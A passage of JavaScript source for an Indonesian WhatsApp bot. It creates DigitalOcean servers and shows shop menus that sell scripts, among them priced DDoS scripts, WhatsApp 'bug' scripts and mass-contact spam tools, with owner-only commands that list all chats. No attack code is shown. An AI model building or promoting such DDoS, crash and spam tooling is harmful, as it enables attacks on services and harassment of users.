  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
        case "cmdmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▭▬▭( *COMMAND BUYSC* )▭▬▭
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2 
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

*SEANDAINYA BOT TIDAK MERESPON SEGERA HUBUNGI OWNER*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
        case "payment": case "nope": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}dana
⭔ ${prefix}gopay
⭔ ${prefix}qris

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "vps": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST VPS BY RAFF OFFCIAL* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ VPS RAM 2GB CORE 1 : 15K
⭔ VPS RAM 2GB CORE 2 : 25K
⭔ VPS RAM 4GB CORE 2 : 35K
⭔ VPS RAM 8GB CORE 4 : 55K
⭔ VPS RAM 16GB CORE 8 : 75K

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "jasa": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST JASA BY RAFF OFFCIAL* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ JASA INSTALL SERVER : 10K
⭔ JASA INSTALL THEMA. : 5K
⭔ JASA FIX SC : 20K
⭔ JASA EDIT SC  : 15K

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case "adminpanel": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ADMIN PANEL* )▭▬▭

⭔${prefix}buyadminpanel
⭔${prefix}panelprem

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "filesc": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FILE SC* )▭▬▭

ReadMe.txt
Sc+v3.zip
all
appearance.js
connect.js
database
freya
node_modules
package-lock.json
package.json
scrape
session
testimoni
thumb.png
v3²

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buyadminpanel": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY ADMIN PANEL* )▭▬▭

*NEED ADMIN PANEL KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6285211724196*
*PEMBAYARAN VIA :*
*-DANA*
*-OVO*
*-QRIS*
*-GOPAY*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "infosc":
owned = `${namaCreator}@s.whatsapp.net`
if (!q) return reply(`*[ SCRIPT BY RIDZ STORE ]*\n\n> MAU BELI SC NYA?\n>SC NYA GAK DI JUAL 😁\nTAPI KALO DI TAKE GANJA GAS\n\n- KEUNTUNGAN :\n> BISA PUSH KONTAK\n> BISA JPM + GAMBAR\n> JPM TANPA CAPE CUMA LEWAT BOT\n> BISA SAVE KONTAK LEWAT ID\n> BISA CREATE PANEL OTOMATIS\n> BISA BUY SC OTOMATIS\n> BISA ADDPM2\n> BISA DDOS\n> BISA SUBDO\n\n*MINAT? CHAT WA DI BAWAH*\n_wa.me/62895354709030`)
break
case "panelprem": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY PANEL PREMIUM* )▭▬▭

*NEED PANEL PREM KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6285211724196*
*PEMBAYARAN VIA :*
*-DANA*
*-OVO*
*-QRIS*
*-GOPAY*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buysc": case "cekharga": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY SCRIPT* )▭▬▭

*Mau Buy Sc? Pilih Sc Dibawah Ini* :

*Sc Bug v1 15k*
*Sc Bug v2 25k*
*Sc Bug v3 35k*
*Sc Hw 19 20k*
*Sc Hw 19 Fitur Jpm 25k*
*Sc Hw 19 Fitur Jpm + Cpanel 30k*
*Sc Campuran v2 15k*
*Sc Campuran v3 25k*
*Sc Campuran v3 + Subdo 30k*
*Sc Campuran v4 35k*
*Sc Campuran v5 50k*
*Sc Campuran v6 60k*
*Sc Campuran v6 + Subdo 70k*
*Sc Campuran v7 + otp 75k*
*Sc Campuran v7 + addpm2 85k*
*Sc Cvps v1 50k*
*Sc Cvps v2 80k*
*Sc Jaga Grupv1 10k*
*Sc Jaga Grupv2 15k*
*Sc Pushkontak 10k*
*Sc PushAutoSave 15k*
*Sc Jpm X PushKntk v1 15k*
*Sc Jpm X PushKntk v2 20k*
*Sc Jpm X PushKntk v3 25k*
*Sc Themav1 10k*
*Sc Themav2 15k*
*Sc Nowa 20k*
*Sc Webp 10k*
*Sc Tesmoni 15k*
*Sc Ddos 20k*
*Sc Buka Enc 15k*
*Module 15k*
*Admin Panel 15k ( Garansi 7Day )*
*All Vps ( Pm Owner )*

*Usahakan Saldo Mu Mencukupi Ya Kak🙏*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sewa": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SEWA BOT PANEL* )▭▬▭

Sewa Bot ? 
Hubungi *@${owned.split("@")[0]}* 
Untuk Nego Harga😁

▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sc": case "script": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SCRIPT* )▭▬▭

Mau Sc ? Buy Ke Dia *@${owned.split("@")[0]}*

© Cs RIDZ STORE
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "storemenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}done
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "linklog": { 
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN :*
${domain}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "ramlist": { 
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RAM YANG TERSEDIA* )▭▬▭

⭔1GB ( *Premium* )✅
⭔2GB ( *Premium* )✅
⭔3GB ( *Premium* )✅
⭔4GB ( *Premium* )✅
⭔5GB ( *Premium* )✅
⭔6GB ( *Premium* )✅
⭔7GB ( *Premium* )✅
⭔8GB ( *Premium* )✅
⭔9GB ( *Premium* )✅
⭔10GB ( *Premium* )✅
⭔UNLI ( *Premium* )✅

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/ramlist.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "tutorial": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sosmed": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOSMED OWNER* )▭▬▭

*INSTAGRAM OWNER :* 
${instagram}
*YOUTUBE OWNER :* 
${youtube}
*TELEGRAM OWNER :* 
${telegram}
*GROUP OWNER :* 
${grup}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "pm2menu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭( *PM2 MENU* )▭▬▭

⭔ ${prefix}buycasepm2
⭔ ${prefix}buyeggpm2
⭔ ${prefix}buyapipm2
⭔ ${prefix}buyscpm2

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "stalkmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STALK MENU* )▭▬▭

⭔ ${prefix}ffstalk

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "swmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SW MENU* )▭▬▭

⭔ ${prefix}buatswimage
⭔ ${prefix}buatswvideo
⭔ ${prefix}buatsw
⭔ ${prefix}swin
⭔ ${prefix}vnsw
⭔ ${prefix}inisw

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "downloadmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOWNLOAD MENU* )▭▬▭

⭔ ${prefix}toaud
⭔ ${prefix}toimg
⭔ ${prefix}tomp4
⭔ ${prefix}ytmp3
⭔ ${prefix}ytmp4
⭔ ${prefix}ytsearch
⭔ ${prefix}smeme
⭔ ${prefix}remini
⭔ ${prefix}hd
⭔ ${prefix}tovn
⭔ ${prefix}togif
⭔ ${prefix}tourl
⭔ ${prefix}tiktok
⭔ ${prefix}tiktokaudio
⭔ ${prefix}mediafire

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "soundmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOUND MENU* )▭▬▭

⭔ ${prefix}sound1
⭔ ${prefix}sound2
⭔ ${prefix}sound3
⭔ ${prefix}sound4
⭔ ${prefix}sound5
⭔ ${prefix}sound6
⭔ ${prefix}sound7
⭔ ${prefix}sound8
⭔ ${prefix}sound9
⭔ ${prefix}sound10

*SOUND SAMPAI 161 TUAN🙏*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "randommenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RANDOM CECAN* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "creategc":{
if (!isOwner) return reply(`Ngapain ? Khusus RIDZ STORE Aja !!`)
if (!text) return reply("Nama groupnya Tuan?")
let cret = await Biiofc.groupCreate(text, [])
let response = await Biiofc.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'domainmenu':{
if (!isOwner) return reply(`Ngapain ? Domain Privasi, Hanya Bisa Oleh Owner RIDZ STORE`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST DOMAIN* )▭▬▭

┏━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain1 jasapanelzku.xyz
┣ ${prefix}domain2 garudanetwork.my.id
┣ ${prefix}domain3 cpanell-net.biz.id
┣ ${prefix}domain4 paneldigital.my.id
┣ ${prefix}domain5 mcstorez.xyz
┣ ${prefix}domain6 mymarket2.biz.id
┣ ${prefix}domain7 panelelite.biz.id 
┣ ${prefix}domain8 panelhost.biz.id 
┣ ${prefix}domain9 panell-net.my.id 
┣ ${prefix}domain10 panellshop.biz.id 
┣ ${prefix}domain11 panellshop.my.id
┣ ${prefix}domain12 panell-tech.biz.id
┣ ${prefix}domain13 pusatnetid.biz.id
┣ ${prefix}domain14 websiteme.my.id 
┣ ${prefix}domain15 rzlmodz.art 
┣ ${prefix}domain16 tds4youpanel.com 
┣ ${prefix}domain17 pannelmurah.xyz
┣ ${prefix}domain18 storepannel.xyz
┣ ${prefix}domain19 tokopannel.xyz
┣ ${prefix}domain20 mypannel.cfd
┣ ${prefix}domain21 adminpannel.xyz
┣ ${prefix}domain22 mypannel.icu
┣ ${prefix}domain23 tokocpannelmurah.xyz
┣ ${prefix}domain24 websitepannelmurah.com
┣ ${prefix}domain25 panellku.my.id
┣ ${prefix}domain26 panellku.me 
┣ ${prefix}domain27 panellku.biz.id 
┣ ${prefix}domain28 panellku.tech 
┣ ${prefix}domain29 panelkuu.xyz
┣ ${prefix}domain30 panellku.com
┣ ${prefix}domain31 biistoreee.tech
┣ ${prefix}domain32 biistoreee.xyz 
┣ ${prefix}domain33 rulzxyxd.com 
┣ ${prefix}domain34 rafatharoffc.dev
┣ ${prefix}domain35 rafatharoffcial.dev
┣ ${prefix}domain36 rizalshop.my.id
┣ ${prefix}domain37 panelku.link
┣ ${prefix}domain38 sanzyy.xyz
┣ ${prefix}domain39 home-panel.pw
┣ ${prefix}domain40 aswinxd.me
┣ ${prefix}domain41 panel-zall.me
┣ ${prefix}domain42 digital-market.me
┣ ${prefix}domain43 rafatharofficial.my.id
┣ ${prefix}domain44 tokodigital.software
┣ ${prefix}domain45 diimzhostt.xyz
┣ ${prefix}domain46 diimzzxd.my.id
┣ ${prefix}domain47 diimz.site
┣ ${prefix}domain48 diimzstore.tech
┣
┗━━━━━━━━━━━━━━━━━━━

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/audio.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break

//batas menu
//domainmenu
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Rafathar = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Biiofc.sendMessage(m.chat, { audio: Rafathar, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'totalfitur':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
reply(`Total Bot Features Are ${totalFitur()}`)
        break
case 'listpc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Biiofc.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Biiofc.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Biiofc.sendTextWithMentions(m.chat, teks, m)
             }
             break
		case 'ytsearch':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
				.then(({ data }) => {
					var text = ''
					for (var x of data.result) {
						text += `Title : ${x.title}\n`
						text += `Views : ${x.views}\n`
						text += `Published : ${x.published}\n`
						text += `Thumbnail : ${x.thumbnail}\n`
						text += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
					}
					reply(text)
				})
				.catch(console.error)
			break
		case 'ytmp3':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					Biiofc.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
						Biiofc.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
		case 'ytmp4':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
